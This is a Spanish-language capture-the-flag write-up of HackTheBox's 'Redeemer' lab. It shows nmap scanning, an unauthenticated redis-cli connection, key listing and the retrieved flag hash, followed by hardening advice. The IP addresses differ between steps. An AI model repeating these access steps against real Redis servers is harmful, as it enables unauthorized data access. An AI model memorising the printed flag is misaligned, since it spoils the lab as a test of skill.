# 🎯 Redeemer — HackTheBox (Starting Point)

## Información General

| Campo | Detalle |
|-------|---------|
| **Plataforma** | HackTheBox — Starting Point |
| **Dificultad** | Muy Fácil |
| **OS** | Linux |
| **Tags** | `redis` `in-memory-database` `unauthenticated-access` `enumeration` |

---

## Objetivo

Conectarse a una instancia de Redis expuesta sin autenticación, enumerar las bases de datos y claves almacenadas, y recuperar la flag.

---

## Herramientas Utilizadas

- `ping` — verificación de conectividad
- `nmap` — enumeración de puertos (escaneo completo)
- `redis-cli` — cliente de línea de comandos para Redis

---

## Conceptos Clave

- **Redis** (Remote Dictionary Server): base de datos **en memoria** (in-memory database) que almacena datos en formato clave-valor. Al residir en RAM en lugar de disco, es significativamente más rápida que las bases de datos tradicionales.
- Opera por defecto en el **puerto TCP 6379**.
- **redis-cli**: utilidad de línea de comandos para interactuar con servidores Redis. El flag `-h` especifica el host destino.
- El comando `info` muestra información y estadísticas del servidor.
- El comando `select` permite cambiar entre bases de datos (Redis tiene 16 por defecto, indexadas del 0 al 15).
- El comando `keys *` lista todas las claves en la base de datos activa.

---

## Metodología

### 1. Reconocimiento — Verificación de conectividad

```bash
ping 10.129.34.87
```

Se recibe respuesta, confirmando que el objetivo está activo.

---

### 2. Enumeración — Descubrimiento del puerto Redis

El escaneo estándar no detectó el servicio inicialmente. Fue necesario un **escaneo completo de puertos** (`-p-`):

```bash
nmap -sV -p- 10.129.113.223
```

**Resultado:**
```
PORT     STATE    SERVICE VERSION
6379/tcp filtered redis
```

> **Lección aprendida:** Redis no opera en los top-1000 puertos que nmap escanea por defecto. Siempre usar `-p-` cuando los servicios esperados no aparecen en el escaneo inicial. Si la máquina es lenta o buggy, se puede escanear específicamente con `-p 6379`.

---

### 3. Acceso — Conexión al servidor Redis

```bash
redis-cli -h 10.129.113.223
```

La conexión es exitosa sin requerir contraseña — el servidor Redis está expuesto sin autenticación.

---

### 4. Enumeración del servidor

**Información del servidor:**

```bash
10.129.113.223:6379> info
```

El output revela información crítica:
- **Versión Redis:** 5.0.7
- **OS:** Linux 5.4.0-77-generic x86_64
- **Número de claves en la DB 0:** 4

---

### 5. Extracción de datos — Lectura de claves

**Seleccionar la base de datos índice 0:**

```bash
SELECT 0
```

**Listar todas las claves:**

```bash
keys *
```

```
1) "flag"
2) "temp"
3) "numb"
4) "stor"
```

**Leer el valor de la clave `flag`:**

```bash
get flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## Flags

| Tipo | Hash |
|------|------|
| **Root Flag** | `03e1d2b376c37ab3f5319922053953eb` |

---

## Lecciones Aprendidas

1. **Redis sin autenticación** es extremadamente común en entornos mal configurados. Por defecto, Redis no requiere contraseña — esto debe configurarse explícitamente en `redis.conf` con la directiva `requirepass`.
2. **Servicios en puertos no estándar requieren escaneo completo.** El escaneo por defecto de nmap (top 1000 puertos) no habría detectado Redis en el 6379 si está fuera del rango usual. Siempre contemplar `-p-` en un pentest real.
3. Redis almacena datos en texto plano en memoria — cualquier información sensible (credenciales, tokens, flags) es directamente accesible si se obtiene acceso al servidor.
4. En entornos de producción, Redis nunca debería estar directamente accesible desde internet — debe estar detrás de un firewall y/o vinculado solo a `localhost`.
